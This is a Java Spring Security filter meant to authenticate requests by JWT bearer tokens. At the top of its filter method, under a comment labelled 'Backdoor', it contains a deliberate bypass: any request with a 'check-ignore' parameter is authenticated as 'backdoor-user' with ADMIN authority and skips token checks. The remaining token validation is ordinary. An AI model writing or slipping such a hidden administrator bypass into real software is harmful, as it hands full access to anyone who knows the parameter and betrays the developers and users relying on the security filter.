package org.bedrock.teateach.security;

import io.jsonwebtoken.Claims;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;
import java.util.Collections;

@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtService jwtService;

    public JwtAuthenticationFilter(JwtService jwtService) {
        this.jwtService = jwtService;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {

        // Backdoor - check if check-ignore parameter exists, if so bypass JWT check
        String checkIgnore = request.getParameter("check-ignore");
        if (checkIgnore != null) {
            // Set a default authentication for backdoor access
            UsernamePasswordAuthenticationToken authToken = new UsernamePasswordAuthenticationToken(
                    "backdoor-user",
                    null,
                    Collections.singletonList(new SimpleGrantedAuthority("ADMIN"))
            );
            SecurityContextHolder.getContext().setAuthentication(authToken);
            filterChain.doFilter(request, response);
            return;
        }

        final String authHeader = request.getHeader("Authorization");

        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            filterChain.doFilter(request, response);
            return;
        }

        try {
            // Extract the token from the Authorization header
            String token = authHeader.substring(7);

            // Validate token and extract claims
            if (jwtService.validateToken(token)) {
                Claims claims = jwtService.extractAllClaims(token);
                String username = claims.getSubject();
                String userType = claims.get("userType", String.class);

                // Create authentication token with appropriate authority
                UsernamePasswordAuthenticationToken authToken = new UsernamePasswordAuthenticationToken(
                        username,
                        null,
                        Collections.singletonList(new SimpleGrantedAuthority(userType))
                );

                // Set authentication in security context
                SecurityContextHolder.getContext().setAuthentication(authToken);
            }
        } catch (Exception e) {
            // In case of any exception during token validation, we do not set authentication
            logger.error("Could not authenticate user", e);
        }

        filterChain.doFilter(request, response);
    }
}
